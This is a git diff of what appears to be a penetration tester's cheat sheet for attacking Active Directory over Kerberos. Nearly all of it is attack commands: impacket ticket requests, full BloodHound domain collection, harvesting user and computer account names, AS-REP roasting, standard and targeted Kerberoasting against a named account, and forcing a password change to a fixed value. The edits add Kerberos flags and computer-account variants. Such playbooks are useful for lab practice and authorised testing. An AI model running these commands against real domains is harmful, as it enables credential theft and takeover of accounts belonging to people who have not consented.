@@ -6,7 +6,7 @@ https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 sudo skewme $TARGET
 
 ## Ticket Granting Ticket
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
+impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'; kcme
 
 ## Bloodhound Data
 bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
@@ -19,14 +19,16 @@ cat /Upload/bloodhound/*_users.json | jq -r '.. | .samaccountname? // empty' | t
 cat /Upload/bloodhound/*_computers.json | jq -r '.. | .samaccountname? // empty' | tee computers_$DC
 
 ## ASREPRoast
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames_$DC
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
 
 ## Kerberoast: Users and Computers
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
 
 ## Kerberoast: Targeted
-impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile usernames_$DC
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -no-preauth 'NPUserjjones' -usersfile computers_$DC
 
 ## Password Change
 impacket-changepasswd $DOM/'$USERNAME:$PASSWORD'@$TARGET -k -p kpasswd -newpass '123qweasdF!'
